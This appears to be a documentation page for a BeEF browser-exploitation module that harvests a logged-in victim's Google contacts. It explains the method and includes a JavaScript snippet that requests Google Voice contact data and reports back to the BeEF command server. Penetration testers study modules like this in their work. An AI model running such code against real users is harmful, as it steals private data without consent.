## Summary

* **Objective**: get google contacts
* **Authors**: Kos, antisnatchor
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/grab_google_contacts)

## Internal Working

sends XHR requests to a google voice url. If the user is logged in, the list of contacts can be obtained

### Note
This can run on normal javascript, does not need extension/plugin privileges.

```js

function grabContacts(){
        var client = new XMLHttpRequest();
        client.open("GET", "https://www.google.com/voice/c/b/X/ui/ContactManager" ,false);
        client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
        client.send();
        if(client.status != 200){ // if the victim is not authenticated in Google, a 403 Forbidden error is received.
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'The victim is not logged in Google.');
        }else{ //proceed
            toolContact(client.responseText);
        }
}

```

## Feedback

